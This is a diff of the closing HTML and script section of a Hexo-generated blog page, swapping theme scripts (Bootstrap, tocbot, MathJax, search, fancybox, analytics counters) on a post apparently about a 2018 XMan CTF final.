-<script type="text/x-mathjax-config">
-  MathJax.Hub.Config({
-    tex2jax: {
-      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
-      processEscapes: true
-    }
-  });
-</script>
-
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Config({
-      tex2jax: {
-        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-      }
-    });
-</script>
-
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax(), i;
-        for(i=0; i < all.length; i += 1) {
-            all[i].SourceElement().parentNode.className += ' has-jax';
-        }
-    });
-</script>
-
-<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
-</script>
-
-
-  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
-  <script src="/fancybox/jquery.fancybox.pack.js"></script>
-
-
-<script src="/js/script.js"></script>
-<script src="/js/bootstrap.js"></script>
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
 <script src="/js/main.js"></script>
 
 
+  <script src="/js/lazyload.js"></script>
+
+
+
+  
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
 
 
 
 
 
-  <div style="display: none;">
-    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
-  </div>
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
 
 
 
+<!-- Plugins -->
 
 
 
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
 
-  </div>
 
-  <a id="rocket" href="#top" class=""></a>
-  <script type="text/javascript" src="/js/totop.js" async=""></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "2018-XMan结营赛&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+  
+
+  
+    <!-- MathJax -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+          tex2jax: {
+              inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+              processEscapes: true,
+              skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+          }
+      });
+
+      MathJax.Hub.Queue(function() {
+          var all = MathJax.Hub.getAllJax(), i;
+          for(i=0; i < all.length; i += 1) {
+              all[i].SourceElement().parentNode.className += ' has-jax';
+          }
+      });
+
+    </script>
+
+    <script src="https://cdn.staticfile.org/mathjax/2.7.7/MathJax.js?config=TeX-MML-AM_CHTML"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
 <script type="text/x-mathjax-config">
   MathJax.Hub.Config("");
 </script>
@@ -400,5 +764,17 @@
 </script>
 <!-- End: Injected MathJax -->
 <!-- hexo-inject:end -->
+
+  
+
+
+
+
+
+
+
+
+
+
 </body>
 </html>
